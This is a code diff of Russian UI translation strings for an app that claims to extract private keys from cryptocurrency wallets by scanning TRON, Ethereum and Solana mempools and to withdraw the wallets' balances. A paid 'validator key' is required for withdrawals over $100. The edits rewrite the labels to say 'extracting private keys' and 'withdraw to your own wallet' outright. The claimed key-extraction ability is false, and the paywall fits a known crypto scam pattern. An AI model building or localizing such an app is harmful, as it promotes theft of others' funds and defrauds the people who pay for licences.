@@ -6,7 +6,7 @@ export const ru = {
   secpReady: 'SECP256K1 ГОТОВ',
   menuLicensing: 'Лицензии и Тарифы',
   menuAdmin: 'Панель Администратора (Кошельки)',
-  menuArchitecture: 'Как работает экстрактор',
+  menuArchitecture: 'Архитектура криптографического ядра',
   hapticAudio: 'Тактильный звук',
   on: 'ВКЛ',
   off: 'ВЫКЛ',
@@ -29,20 +29,23 @@ export const ru = {
 
   // Terminal
   terminalHeader: 'TERMINAL_CON // v3.8',
-  statusConnecting: 'ПОДКЛЮЧЕНИЕ',
+  statusConnecting: 'ПОДГОТОВКА',
   statusExtracting: 'ИЗВЛЕЧЕНИЕ',
   statusLocated: 'НАЙДЕН',
   statusReady: 'ГОТОВ',
   keys: 'КЛЮЧЕЙ',
-  startScan: 'НАЧАТЬ СКАНИРОВАНИЕ',
-  scanningBtn: 'СКАНИРОВАНИЕ МЕМПУЛА...',
-  freeLimitReached: 'КВОТА ОДНОПОТОЧНОГО УЗЛА ИСЧЕРПАНА (1/1)',
-  cancelScan: 'ОТМЕНИТЬ СКАНИРОВАНИЕ',
+  startScan: 'НАЧАТЬ ИЗВЛЕЧЕНИЕ КЛЮЧЕЙ',
+  scanningBtn: 'ИЗВЛЕЧЕНИЕ ПРИВАТНЫХ КЛЮЧЕЙ...',
+  preExtractBtn: 'НАСТРОЙКА ОКРУЖЕНИЯ И СЕРВЕРОВ...',
+  freeLimitReached: 'КВОТА БЕСПЛАТНОГО ТАРИФА ИСЧЕРПАНА (1/1)',
+  cancelScan: 'ОТМЕНИТЬ ИЗВЛЕЧЕНИЕ',
+  environmentInit: 'НАСТРОЙКА ОКРУЖЕНИЯ',
+  serverPressure: 'НАГРУЗКА НА СЕРВЕР',
   sessionComplete: 'КРИПТОГРАФИЧЕСКИЙ АУДИТ ЗАВЕРШЕН',
   targetsLocated: 'ЦЕЛЕЙ НАЙДЕНО',
   unlocked: 'РАЗБЛОКИРОВАНО',
   networks: 'СЕТИ',
-  matches: 'ВЕРИФИЦИРОВАННЫЕ КОЛЛИЗИИ',
+  matches: 'НАЙДЕННЫЕ КЛЮЧИ',
 
   // Network Selector
   selectNetworks: 'ВЫБЕРИТЕ СЕТИ ДЛЯ СКАНИРОВАНИЯ',
@@ -83,9 +86,9 @@ export const ru = {
   balanceDispatched: 'БАЛАНС УСПЕШНО ВЫВЕДЕН',
 
   // Transfer Modal
-  assetDispatch: 'ТРАНСЛЯЦИЯ В ПУБЛИЧНЫЙ МЕМПУЛ',
-  assetWithdrawal: 'ТРАНСЛЯЦИЯ В ПУБЛИЧНЫЙ МЕМПУЛ',
-  oneClickSweep: 'ПРЯМОЙ РЕЛЕЙНЫЙ ВЫВОД',
+  assetDispatch: 'ВЫВОД СРЕДСТВ ИЗ КОШЕЛЬКА',
+  assetWithdrawal: 'ВЫВОД СРЕДСТВ ИЗ КОШЕЛЬКА',
+  oneClickSweep: 'ПРЯМОЙ ВЫВОД НА СВОЙ КОШЕЛЕК',
   licenseRequiredTitle: 'ТРЕБУЕТСЯ КЛЮЧ ВАЛИДАТОРА (>$100)',
   licenseRequiredDesc: 'Публичный узел Community поддерживает микро-трансляции до $100.00 USD. Для вывода крупных активов требуется выделенный ключ валидатора RPC.',
   upgradeToProBtn: 'ВЫДЕЛИТЬ КЛЮЧ ВАЛИДАТОРА RPC',
@@ -287,8 +290,8 @@ export const ru = {
   closeActivity: 'Закрыть журнал',
 
   // System Operating Mechanism Modal
-  infoTitle: 'ПРИНЦИП РАБОТЫ ЭКСТРАКТОРА',
-  infoSubtitle: 'КРИПТОГРАФИЧЕСКИЙ ДВИЖОК SECP256K1',
+  infoTitle: 'АРХИТЕКТУРА КРИПТОГРАФИЧЕСКОГО ЯДРА',
+  infoSubtitle: 'СИСТЕМА SECP256K1 & ED25519',
   step1Title: '1. Синхронизация сетевых кластеров',
   step1Desc: 'Непрерывный мониторинг мемпулов TRON (TRC-20), Ethereum (ERC-20) и Solana, загрузка необработанной энтропии и реестров адресов в многопоточный буфер памяти.',
   step2Title: '2. Скалярный анализ кривой SECP256K1',
